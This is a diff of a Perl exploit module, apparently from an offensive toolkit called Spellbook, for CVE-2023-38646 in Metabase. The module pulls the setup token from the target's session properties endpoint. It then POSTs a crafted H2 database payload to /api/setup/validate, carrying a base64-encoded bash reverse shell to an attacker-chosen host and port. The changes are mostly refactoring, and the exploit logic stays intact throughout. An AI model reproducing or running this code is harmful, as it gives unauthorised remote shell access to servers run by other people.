@@ -23,23 +23,23 @@ package Spellbook::Advisory::CVE_2023_38646 {
         );
 
         if ($target) {
-            if ($target !~ /^http(?:s)?:\/\//x) {
+            if ($target !~ /^http(s)?:\/\//x) {
                 $target = "https://$target";
             }
 
             my $userAgent = Spellbook::Core::UserAgent -> new();
-            my $initial_request   = $userAgent -> get("$target/api/session/properties");
+            my $request   = $userAgent -> get("$target/api/session/properties");
 
-            if ($initial_request -> code() == 200) {
+            if ($request -> code() == 200) {
                 try {
-                    my $content = decode_json($initial_request -> content);
+                    my $content = decode_json($request -> content);
                     my $token = $content -> {"setup-token"};
 
                     if ($token) {
                         my $headers = HTTP::Headers -> new ("Content-Type" => "application/json");
                         my $reverse = encode_base64("bash -i >& /dev/tcp/$remote/$port 0>&1", "");
 
-                        my $payload = {
+                        my $payload = qq({
                             "token": "$token",
                             "details": {
                                 "is_on_demand": false,
@@ -57,12 +57,10 @@ package Spellbook::Advisory::CVE_2023_38646 {
                                 "name": "an-sec-research-team",
                                 "engine": "h2"
                             }
-                        };
+                        });
 
-                        my $json_payload = encode_json($payload);
-
-                        my $exploit_request  = HTTP::Request -> new("POST", "$target/api/setup/validate", $headers, $payload);
-                        my $response = $userAgent -> request($exploit_request);
+                        my $request  = HTTP::Request -> new("POST", "$target/api/setup/validate", $headers, $payload);
+                        my $response = $userAgent -> request($request);
 
                         if ($response -> code() == 400) {
                             push @result, "\n[+] $target exploited\n";
@@ -75,16 +73,13 @@ package Spellbook::Advisory::CVE_2023_38646 {
         }
 
         if ($help) {
-            return<<"EOT";
-
-Exploit::CVE_2023_38646
-=======================
--h, --help     See this menu
--t, --target   Define a target
--r, --remote   Set the address to receive the reverse shell
--p, --port     Set the port of reverse shell\n\n";
-
-EOT
+            return "
+                \rExploit::CVE_2023_38646
+                \r=======================
+                \r-h, --help     See this menu
+                \r-t, --target   Define a target
+                \r-r, --remote   Set the address to receive the reverse shell
+                \r-p, --port     Set the port of reverse shell\n\n";
         }
 
         return 0;
